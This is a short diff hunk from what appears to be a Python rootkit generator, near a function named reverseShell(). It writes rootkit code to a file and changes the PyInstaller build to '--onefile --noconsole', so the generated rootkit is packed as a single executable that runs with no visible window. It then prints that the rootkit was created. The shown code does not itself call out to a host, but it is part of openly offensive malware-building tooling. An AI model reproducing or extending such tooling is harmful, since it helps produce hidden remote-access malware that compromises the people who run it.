@@ -373,7 +373,7 @@ reverseShell()
                     file.write(rootkit)
                     file.write(rootkit2)
 
-                    os.system(f'pyinstaller -F -D {fileNameInPython} && del {fileName}.spec')
+                    os.system(f'pyinstaller --onefile --noconsole {fileNameInPython} && del {fileName}.spec')
                     
                     print('\n[+] Rootkit Successfully Created In EXE And PY Format In Rootkits Folder\n')
                     print('[?] EXE FORMATTED ROOTKIT IS IN THE "dist" FOLDER\n')
